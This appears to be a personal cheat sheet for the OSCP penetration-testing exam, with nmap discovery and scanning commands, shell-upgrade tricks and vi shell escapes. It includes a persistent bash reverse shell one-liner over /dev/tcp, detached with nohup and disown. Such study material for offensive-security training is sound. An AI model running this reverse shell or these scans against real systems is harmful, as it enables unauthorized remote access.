# OSCP-CheatSheet
My personal cheat sheet for the OSCP exam, I Also have added to the repo some key tools for easy access.

## Information Gathering & Enumeration:

### Host Discovery 
Basic host discovery:

`sudo nmap -sn <ip-range>`

Remember Windows machines drop ICMP packets by default (-Pn) and when tunneling with ligolo sync scans (-sS) don't work. But we can use 

`nmap -sT -sU -Pn -p T:22,80,443,445,3389,U:53,123,161 <ip-range>`

### Port Scanning
I like to seperate port discovery from port enumeration, I think it's more organized and saves time.

Port Discovery:
Be thorough scan every TCP and UDP port, taking your time on enumeration saves you time in the long run. 

`nmap -Pn -sS -p- -T5 <ip>`

`nmap -Pn -sU -p- -T5 <ip>`

Port Enumeration:

`nmap -sS -sV -sC -p <ports> -T5 <ip>`

`nmap -sU -sV -sC -p <ports> -T5 <ip>`

`nmap -sV --script vuln -p <ports> <ip>`

## Exploitation:

### Reverse Shell Payloads
This payload is a normal bash revshell, but I used `nohup` and `disown`  to detach the process so it doesn't die if the current session gets closed 

`( nohup setsid bash -c 'YOUR_NEW_CONNECTION_COMMAND_HERE' >/dev/null 2>&1 & ) ; disown`

`( nohup setsid bash -c "exec bash -i &>/dev/tcp/<ip>/<port> <&1" >/dev/null 2>&1 & ) ; disown`

## Post-Exploitation:

### Upgrading a simple Shell
using python:
1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm`
3. Background the shell with Ctrl+z
4. `stty raw -echo; fg`
5. `stty rows 38 columns 116`

using system os:
`echo os.system("/bin/bash")`

with Bash:
`/bin/sh -i`

with Vi
`:!bash`

`:set shell=/bin/bash:shell`

### Privilege Escalation

### Pivoting & Tunneling

